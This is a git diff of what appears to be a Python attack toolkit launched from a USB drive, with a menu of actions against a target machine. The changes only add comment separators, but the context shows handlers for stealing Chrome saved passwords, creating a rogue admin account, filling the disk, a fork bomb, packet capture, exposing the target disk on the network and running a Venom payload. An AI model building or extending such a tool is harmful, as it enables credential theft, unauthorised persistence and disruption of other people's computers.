@@ -503,6 +503,7 @@ while True:
 #
 #
 #
+
 #Action ftp = FTP connection
     if action == "ftp":
         logging.info(f"Chosen action ftp to attempt FTP connection")
@@ -527,6 +528,7 @@ while True:
 #
 #
 #
+
 #Action ping = pinging target IP
     if action == "ping":
         logging.info(f"Chosen action ping to check IP connectivity and response")
@@ -548,6 +550,7 @@ while True:
 #
 #
 #
+
 #Action DiskFiller = filling up disk space
     if action == "DiskFill" or action == "diskfill":
         logging.info(f"Chose action DiskFill to fill a target computer disk")
@@ -574,6 +577,7 @@ while True:
 #
 #
 #
+
 #Action DiskHoster = hosting target disk on local network
     if action == "DiskHost" or action == "diskhost":
         logging.info(f"Chosen action DiskHost to host target disk onto a local network")
@@ -600,6 +604,7 @@ while True:
 #
 #
 #
+
 #Action AddAdmin = creating new admin account on target machine
     if action =="AddAdmin" or action == "addadmin":
         logging.info(f"Chosen action AddAdmin to generate a new admin account on target machine")
@@ -629,6 +634,7 @@ while True:
 #
 #
 #
+
 #Action PassExport = retrieving Chrome saved passwords
     if action == "PassExport" or action == "passexport":
         logging.info(f"Chosen action PassExport to retrieve Chrome browsing history")
@@ -870,6 +876,17 @@ while True:
         sleep(0.1)
 
 
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#Action ForkBomb = attempting a forkbomb
 
     if action == "ForkBomb" or action == "forkbomb":
         logging.info(f"Chosen to attempt a forkbomb")
@@ -941,7 +958,17 @@ while True:
             input("Press Enter to continue...")
 
 
-
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+  
 #action PacketCapture = capturing packets on target machine
     if action == "PacketCapture" or action == "packetcapture":
         logging.info(f"Chosen action PacketCapture to capture packets")
@@ -966,13 +993,27 @@ while True:
 #
 #
 #
-    
+
+#Action Venom = running a Venom payload
     if action == "Venom" or action == "venom":
         logging.info(f"Chosen action Venom to run a Venom payload")
         venom=input("Enter full path to the payload (example D:\\USB\\Attack\\Venom\\payload.exe): ")
         run_ps(venom)
 
-   #Action exit = exiting the program
+
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+  
+
+#Action exit = exiting the program
     if action == "exit":
         logging.info(f"Chosen action PassExport to exit the program")
         print("Exiting the program...")
